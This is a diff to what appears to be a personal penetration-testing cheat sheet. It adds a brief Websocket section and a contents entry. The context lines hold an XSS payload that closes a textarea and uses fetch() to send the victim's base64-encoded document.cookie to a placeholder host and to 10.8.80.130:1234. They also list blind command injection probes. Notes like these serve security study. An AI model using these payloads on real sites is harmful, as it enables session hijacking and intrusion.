@@ -7,6 +7,7 @@
   - [File inclusion](#file-inclusion)
   - [SSRF](#ssrf)
   - [XSS](#xss)
+  - [Websocket](#websocket)
   - [Command injection](#command-injection)
   - [Authentication](#authentication)
   - [database](#database)
@@ -103,6 +104,13 @@ Insecure Direct Object Request
 - Payload for shell: </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
 -                    </textarea><script>fetch('http://10.8.80.130:1234?cookie=' + btoa(document.cookie) );</script> 
 
+
+## Websocket
+- Bidirectional
+- Exploit message content
+- Change "X-Forwarded-For" header
+  
+  
 ## Command injection
 - blind: no output, test with ping/sleep/timeout(win) || force output > etwas
   - curl http://website/command
